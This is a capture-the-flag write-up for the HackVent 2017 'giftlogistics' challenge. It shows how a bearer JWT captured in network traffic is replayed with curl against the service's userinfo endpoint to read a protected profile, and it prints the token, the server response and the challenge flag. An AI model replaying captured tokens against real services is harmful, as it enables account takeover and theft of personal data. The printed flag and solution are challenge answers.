---
layout: writeup
title: 'Dec 12: giftlogistics'
level:
difficulty:
points:
categories: []
tags: []
flag: HV17-eUOF-mPJY-ruga-fUFq-EhOx

---

*countercomplete inmeasure*

## Challenge

Most passwords of Santa GiftLogistics were stolen. You find an example
of the traffic for Santa's
account with password and everything. The Elves CSIRT Team detected this
and made sure that
everyone changed their password.

Unfortunately this was an incomplete countermeasure. It's still possible
to retrieve the
protected user profile data where you will find the flag.

[Traffic](writeupfiles/giftlogistics.pcapng)

\[Link\]

## Solution

Link to a Gift Logistics website for Santa

![](writeupfiles/dec12-ss.png)

We open the pcap in wireshark, and find a jwt token:

    eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q

with an expiry date far in the future according to https://jwt.io/

We also find a reference to an openID configuration file (from tcp
stream 20)

    {
        "request_parameter_supported": true,
        "claims_parameter_supported": false,
        "introspection_endpoint": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/introspect",
        "scopes_supported": ["openid", "profile", "email", "address", "phone", "offline_access"],
        "issuer": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/",
        "userinfo_encryption_enc_values_supported": ["A256CBC+HS512", "A256GCM", "A192GCM", "A128GCM", "A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512", "A128CBC+HS256"],
        "id_token_encryption_enc_values_supported": ["A256CBC+HS512", "A256GCM", "A192GCM", "A128GCM", "A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512", "A128CBC+HS256"],
        "authorization_endpoint": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/authorize",
        "service_documentation": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/about",
        "request_object_encryption_enc_values_supported": ["A256CBC+HS512", "A256GCM", "A192GCM", "A128GCM", "A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512", "A128CBC+HS256"],
        "userinfo_signing_alg_values_supported": ["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"],
        "claims_supported": ["sub", "name", "preferred_username", "given_name", "family_name", "middle_name", "nickname", "profile", "picture", "website", "gender", "zoneinfo", "locale", "updated_at", "birthdate", "email", "email_verified", "phone_number", "phone_number_verified", "address"],
        "claim_types_supported": ["normal"],
        "op_policy_uri": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/about",
        "token_endpoint_auth_methods_supported": ["client_secret_post", "client_secret_basic", "client_secret_jwt", "private_key_jwt", "none"],
        "token_endpoint": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/token",
        "response_types_supported": ["code", "token"],
        "request_uri_parameter_supported": false,
        "userinfo_encryption_alg_values_supported": ["RSA-OAEP", "RSA-OAEP-256", "RSA1_5"],
        "grant_types_supported": ["authorization_code", "implicit", "urn:ietf:params:oauth:grant-type:jwt-bearer", "client_credentials", "urn:ietf:params:oauth:grant_type:redelegate"],
        "revocation_endpoint": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/revoke",
        "userinfo_endpoint": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo",
        "token_endpoint_auth_signing_alg_values_supported": ["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"],
        "op_tos_uri": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/about",
        "require_request_uri_registration": false,
        "id_token_encryption_alg_values_supported": ["RSA-OAEP", "RSA-OAEP-256", "RSA1_5"],
        "jwks_uri": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/jwk",
        "subject_types_supported": ["public", "pairwise"],
        "id_token_signing_alg_values_supported": ["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512", "none"],
        "registration_endpoint": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/register",
        "request_object_signing_alg_values_supported": ["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"],
        "request_object_encryption_alg_values_supported": ["RSA-OAEP", "RSA-OAEP-256", "RSA1_5"]
    }

Description says we can find our flag in protected user profile data,
and after some poking around we find:

    curl "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo?access_token=eyJraWQiOiJyc2ExIiwi
    YWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh
    0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzN
    iwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVb
    zC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0
    MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A
    5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q" -i
    HTTP/1.1 200 OK
    Server: Apache-Coyote/1.1
    Access-Control-Allow-Origin: *
    Content-Type: application/json;charset=ISO-8859-1
    Content-Language: en
    Content-Length: 98
    Date: Mon, 11 Dec 2017 23:34:09 GMT

    {"sub":"HV17-eUOF-mPJY-ruga-fUFq-EhOx","name":"Reginald Thumblewood","preferred_username":"santa"}
{: .language-bash}

